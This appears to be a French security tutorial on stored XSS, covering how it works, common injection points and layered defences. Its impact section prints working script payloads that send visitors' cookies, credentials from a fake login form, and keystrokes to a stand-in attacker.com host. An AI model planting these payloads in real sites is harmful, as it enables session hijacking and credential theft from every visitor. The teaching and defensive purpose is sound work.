Qu'est-ce que le XSS Stocké ?

Le XSS Stocké (Stored/Persistent XSS) est le type de XSS le plus dangereux. Le script malveillant est enregistré de manière permanente sur le serveur (base de données, fichier) et s'exécute automatiquement chez tous les utilisateurs qui consultent le contenu infecté.

🎯 Caractéristiques :

  • Persistant : Le script est stocké en base de données
  • Automatique : S'exécute sans interaction de la victime
  • Impact massif : Affecte tous les visiteurs de la page
  • Plus difficile à détecter : Pas visible dans l'URL

💡 Exemple d'attaque :

# Attaquant poste un commentaire malveillant Commentaire: "Super article ! <script> fetch('https://attacker.com/steal', { method: 'POST', body: document.cookie }); </script>" # Le commentaire est stocké en BDD # Chaque visiteur qui charge la page exécute le script # → Vol de session de TOUS les visiteurs !

🎯 Vecteurs courants de XSS Stocké :

  • Commentaires/Forums : Messages, réponses, discussions
  • Profils utilisateur : Bio, signature, nom d'affichage
  • Messages privés : Chat, messagerie interne
  • Avis/Reviews : Évaluations de produits
  • Pages wiki : Contenu éditable par les utilisateurs
  • Logs/Historique : Enregistrements affichés aux admins
  • Formulaires de contact : Messages stockés pour traitement

💥 Impacts du XSS Stocké (Cas réels) :

1. Vol de cookies de session (Session Hijacking)

<script> fetch('https://attacker.com/steal?c=' + document.cookie); </script>

L'attaquant récupère les sessions de TOUS les visiteurs.

2. Phishing interne

<script> document.body.innerHTML = ` <h1>Session expirée</h1> <form action="https://attacker.com/phish"> Login: <input name="user"> Password: <input type="password" name="pass"> <button>Se reconnecter</button> </form> `; </script>

Faux formulaire de connexion qui envoie les identifiants à l'attaquant.

3. Keylogger

<script> document.addEventListener('keypress', (e) => { fetch('https://attacker.com/log?key=' + e.key); }); </script>

Enregistrement de toutes les frappes clavier des visiteurs.

4. Worm auto-réplicatif (comme Samy Worm - MySpace 2005)

Script qui se propage automatiquement à tous les profils visités.

🛡️ Défenses contre le XSS Stocké :

Couche 1 : Validation d'entrée

  • Whitelist : N'autoriser que les caractères/balises nécessaires
  • Longueur maximale : Limiter la taille des champs
  • Validation de format : Email, URL, numéros

Couche 2 : Sanitization

  • HTMLPurifier (PHP) : Nettoyage HTML sécurisé
  • DOMPurify (JavaScript) : Sanitization côté client
  • Bleach (Python) : Nettoyage de HTML
  • Strip-tags : Suppression complète des balises si pas de HTML autorisé

Couche 3 : Échappement de sortie (Encoding)

  • htmlspecialchars() PHP : Conversion < > en entités HTML
  • Échappement contextuel : HTML, JavaScript, URL, CSS
  • Template engines : Auto-escape (Twig, Jinja2, Handlebars)

Couche 4 : En-têtes de sécurité

  • Content-Security-Policy : Bloquer scripts inline et sources non autorisées
  • X-XSS-Protection : Filtre XSS du navigateur (deprecated mais utile)
  • HttpOnly cookies : Empêcher l'accès JavaScript aux cookies
